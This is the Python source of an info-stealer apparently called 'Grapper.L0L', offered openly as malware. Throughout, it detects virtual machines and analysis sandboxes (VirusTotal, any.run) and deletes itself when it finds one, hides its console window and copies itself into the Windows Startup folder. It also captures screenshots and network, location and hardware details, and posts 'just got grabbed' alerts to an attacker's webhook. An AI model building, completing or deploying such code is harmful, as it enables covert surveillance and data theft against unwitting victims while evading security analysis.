anti_vm = False
anti_vt = False
anti_arun = False
destruct = False
hide = False
ss = False
startup = False
con_info = False
pc_info = False

import os
try:
    import requests
    import psutil
    import json
    import platform
    import sys
    import socket
    import ctypes
    import secrets
    import string
    import shutil
    import pyautogui
    import subprocess

except Exception as e:
    if hide:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)
    for pac in ["requests","psutil","pyautogui","secrets"]:
        os.system(f"pip install -q {pac}")
    import requests
    import psutil
    import json
    import platform
    import sys
    import socket
    import ctypes
    import secrets
    import string
    import shutil
    import pyautogui
    import subprocess


class util:
    def destruct():
        os.remove(os.path.abspath(__file__))

    def gen_str(length):
        stringg = ''.join(secrets.choice(string.ascii_letters) for _ in range(length))
        return stringg

class dir:
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

class anti:
    def vm():
        ram_gb = psutil.virtual_memory().total / (1024 ** 3)
        if ram_gb < 4:
            return True

        disk_gb = psutil.disk_usage('/').total / (1024 ** 3)
        if disk_gb < 120:
            return True

        # from https://github.com/itschasa/Bypass-VirusTotal/blob/main/main.py (archive)
        def get_base_prefix_compat():
            return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

        def in_virtualenv(): 
            return get_base_prefix_compat() != sys.prefix

        if in_virtualenv():
            return True      
            
    def vt():
        user = os.getlogin()
        data = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt")
        data = data.text
        if user in data:
            return True
        
        name = socket.gethostname()
        data = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt")
        data = data.text
        if name in data:
            return True
        
    def arun():
        if platform.system() == "Windows" and platform.version().startswith("6.1"):
            return True
            

wb = ''

def send_embed():
    config = f"""
anti VM = {anti_vm}
anti Virustotal = {anti_vt}
anti any.run = {anti_arun}
auto destrct = {destruct}
hide = {hide}
screenshoot = {ss}
startup = {startup}
connection info fetcher = {con_info}
pc info fetcher = {pc_info}
"""
    try:
        embed = {
            "title": "Grapper.L0L",
            "color": 16776960,
            "fields": [
                {"name": " 🔎 OS", "value": f"{platform.platform()}", "inline": False},
                {"name": " 👤 Win user", "value": f"{os.getlogin()}", "inline": False},
                {"name": " ⚙ Config", "value": f"{config}", "inline": False},

            ],
        }

        payload = {
            "username": "Grapper.L0L",
            "avatar_url": "https://your-avatar-url.com/avatar.png",
            "embeds": [embed],
        }

        requests.post(wb, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
    except:
        pass


def send_file():
    pass

def send_message():
    try:
        payload = {
            "content": f"||@everyone|| {os.getlogin()} just got grabbed! gathering and sending info...",
            "username": "Grapper.L0L",
            "avatar_url": "https://your-avatar-url.com/avatar.png",
        }
        requests.post(wb, data=payload)
    except:
        pass

def alert(type):
    try:
        payload = {
            "content": f"||@everyone|| :rotating_light: ALERT! :rotating_light: {type} DETECTED!",
            "username": "Grapper.L0L",
            "avatar_url": "https://your-avatar-url.com/avatar.png",
        }
        requests.post(wb, data=payload)
    except:
        pass

while __name__ == "__main__":
    if anti_vm:
        if anti.vm():
            alert("VM")
            util.destruct()
            exit()

    if anti_vt:
        if anti.vt():
            alert("Virus total")
            util.destruct()
            exit()

    if anti_arun:
        if anti.arun():
            alert("Any.run")
            util.destruct()
            exit()

    if hide:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)

    folder_name = fr"C:\temp_{util.gen_str(5)}"
    os.mkdir(folder_name)
    send_message()
    send_embed()

    if startup:
        shutil.copy(os.path.abspath(__file__), dir.startup)

    if ss:
        pyautogui.screenshot().save(f"{folder_name}/screen.png")

    if con_info:
        result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
        if result.returncode == 0:
            ipcfgdata = result.stdout
        else:
            ipcfgdata = "Failed to fetch"
        r = requests.get("https://ipinfo.io/")
        data = f"""
ip: {r.json().get('ip')}
hostname: {r.json().get('hostname')}
city: {r.json().get('city')}
region: {r.json().get('region')}
country: {r.json().get('country')}
location: {r.json().get('loc')}
org: {r.json().get('org')}
postal: {r.json().get('postal')}
timezone: {r.json().get('timezone')}

$$$ --------------------------------------------- $$$

        {ipcfgdata}
        """
        with open(f"{folder_name}/connectioninfo.txt", "w") as f:
            f.write(data)
    
    if pc_info:
        os.mkdir(f"{folder_name}/pcinfo")
        system_info = f"""
Main       

System: {platform.system()},
PC name: {platform.node()},
Release: {platform.release()},
Version: {platform.version()},
        """

        cpu_info = f"""
CPU

Processor: {platform.processor()}
Architecture: {platform.architecture()[0]}
Machine: {platform.machine()},
Processor: {platform.processor()}
        """

        ram_info = f"""
RAM

Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB
        """

        disk_info = f"""
DISK

Total Disk Space: {round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB
Used Disk Space: {round(psutil.disk_usage('/').used / (1024 ** 3), 2)} GB
Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
        """

        data = system_info + cpu_info + ram_info + disk_info

        with open(f"{folder_name}/pcinfo/Specs.txt", "w") as f:
            f.write(data)


    input("END")
    shutil.rmtree(folder_name)
    if destruct:
        util.destruct()
    exit()
    
